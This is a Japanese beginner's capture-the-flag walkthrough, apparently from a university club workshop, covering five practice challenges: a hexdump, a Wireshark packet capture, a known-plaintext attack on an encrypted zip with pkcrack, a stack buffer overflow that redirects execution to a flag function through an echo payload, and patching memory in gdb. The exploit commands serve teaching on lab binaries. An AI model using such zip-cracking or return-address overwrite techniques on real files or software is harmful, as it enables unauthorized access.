このコンピュータでは、マウスを使った操作ではなく、キーボードでコマンドを入力することによって操作をしてもらいます。
ターミナルというコマンドを入力する画面を開き、下記のコマンドを入力してみて下さい。
ls :カレントディレクトリ（現在いるフォルダの階層）の中のファイルやフォルダを表示するコマンド。
cd Downloads :カレントディレクトリをDownloadsというディレクトリに移動するコマンド。
vim test :vimはテキストエディタ（メモ帳みたいなもの）の一種で、テキストファイルを見たいときに使う。
今後は、このような操作を組み合わせて問題を解いていきます。
mkdir (ハンドルネーム)で自分のディレクトリを作ってもらって、
cd (上記で作ったディレクトリ)で移動して、そこで作業してください。

easy_1
スコアサーバから問題をダウンロードします。 
ls
コマンドを実行すると、easy_1というファイルが存在することが確認できます。
しかし、ファイルの種類が分からないとどうしようもないので、ファイルの種類を表示するコマンドを実行します。
file easy_1
このコマンドを実行すると、easy_1: ELF 64-bit LSB  executable....という結果が表示されます。
重要なのが、ELFという単語で、これは実行可能ファイル（windowsで言うexeファイルのようなもの）を表しています。
つまりeasy_1は実行可能ファイルなので、とりあえず実行してみましょう。
linuxでの実行はこのようにやります。
./easy_1
このままだと、実行権限がなくPermission deniedと言われるので、
chmod 777 easy_1
として実行権限を与えます。
その後また
./easy_1
をしてみて下さい。
しかし、実行結果はSleepy...と表示されるだけでフラグを出してくれません。
そこで、この実行可能ファイルの解析を試みます。
ご存知の通り、コンピュータは０と１しか理解しません。つまりeasy_1という実行可能ファイルも
コンピュータにとっては０１の命令でしかありません。まずはそれを確かめてみましょう。
hexdump -C easy_1 | less
このコマンドを実行すると、数字とアルファベットがゴチャゴチャになったものが表示されると思いますが、
これが機械語（コンピュータが理解する命令）です。０と１だけじゃないじゃないかと思うかもしれませんが、これは０と１の羅列を人間に見やすく１６進数で表したものだからです。
キーボードのｊを押すと下にスクロールできるので、しばらく見てみてください。
しばらくすると、フラグが現れると思います。

easy_2
次は、ネットワークの問題です。
日々Chrome,Firefox,Internet Explorerなどのブラウザを使ってネットサーフィンしている人は多いと思います。この問題はその通信に関する問題です。
ブラウザでウェブページを開こうとすると、googleのサイトならgoogleのサーバーに「こういうウェブページが見たいから頂戴」という
リクエストが飛び、サーバーはそれに答えてウェブページをあなたのパソコンに送信します。
このことをもっと詳しく見てみます。
easy_2をダウンロードして、
ls
を実行すると、easy_2.pcapというファイルがあることがわかると思います。
easy_1で学んだ通り、分からないファイルに対してはfileコマンドを実行してみましょう。
file easy_2.pcap
しかし、いきなりpcap-ng capture file と言われても何のことか分からないと思います。
このファイルは、通信を記録したパケットキャプチャファイルと呼ばれています。
wiresharkというパケット解析ツールを利用して、中身を見てみましょう。
wireshark easy_2.pcap
これで見ると、TCPというプロトコルで通信していることがわかると思います。
一番上の三行はTCPのプロトコルで接続を確立しているところで、3wayハンドシェイクと呼ばれています。
このサイトが詳しいので参考にしてください。
http://www.infraexpert.com/study/tcpip9.html
サーバから送られてくるデータ(TCPのFlagが[PSH,ACK]のパケット)を見ると末尾のデータに怪しいascii文字が含まれていることがわかります。
これを辿って行くと、サーバからクライアントにフラグが送られていることがわかります。

easy_3
パスワードのかかったzipファイルが与えられます。
見てみると、flag.txtとbuho310.pdfというファイルがあることがわかります。
flag.txtはフラグが書いてあるファイルだとして、buho310.pdfはなんだろうなぁと考えます。
ここで、buho310と検索してみると、下の方にTSGで出している部誌があると思います。
平文が分かっているファイルがzipファイルの中にあるときは、既知平文攻撃が成り立つ可能性があります。
既知平文攻撃と検索すると、pkcrackというツールが見つかります。ホームディレクトリにpkcrackが既にダウンロードしてあります。
buho310.pdfをダウンロードして、解析を始めてみましょう。
~/pkcrack-1.2.2/src/pkcrack -C easy_3.zip -c buho310.pdf -p buho310.pdf -P buho.zip -d decrypt.zip
buho.zipは、buho310.pdfをzip化したものです。
10分程度解析に時間がかかってしまうかもしれませんが、解析が終わるとdecrypt.zipというパスワードがかかっていないzipファイルができます。
unzip decrypt.zip
で解凍します。

easy_4
file easy_4
を実行すると、実行可能ファイルだということがわかるので、とりあえず実行してみます。
./a.out
Hi, what's your name?
と言われるので、適当に入力すると終了します。
試しにとても長い文字列を入力すると、
*** stack smashing detected ***: ./a.out terminated
と言われます。バッファオーバーフローが起きたことがわかります。
objdump -d easy_4 | less
でアセンブリが得られます。jを押してアセンブリを見てみると、,,
という関数が見えます。
flagという関数が怪しく、putsもあるしフラグが出力されそうだなぁとわかります。
gdbで実行して、なんとかしてflag関数に飛ばそうと考えます。
gdb ./a.out
b main
n,sで実行します。nは関数を飛ばし、sは関数の中に入ります。
buflowのretで、スタックの一番上のアドレスをメモします。
また、disass flagでflagのアドレスをメモします。
0x08048494
scanfで得た入力が確保されるスタック上の領域より下にリターンアドレスの戻り値の領域が存在するので、flagのアドレスを何回も入力したらいいかなぁと思います。
echo -e "\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08\x94\x84\x04\x08" | ./easy_4

easy_5
gdb easy_5
をすると、flagという関数を呼んでいることがわかるので、中に入ってみます。
すると、
mov    DWORD PTR [ebp-0xc],0x0
の後に
cmp    DWORD PTR [ebp-0xc],0x0
した後に、
je     0x804843c 
して、ゼロフラグが1だったらジャンプしているということがわかります。
また、通常ではジャンプするので、ジャンプをしないようにputsを呼ぶようにします。
p $ebp-0xc
してみると比べているアドレスがわかるので、そのアドレスを0以外の値に書き換えます。
たとえば、
set *0xffffd04c=1
そしてcmp後実行を続けると、フラグが出てきます。
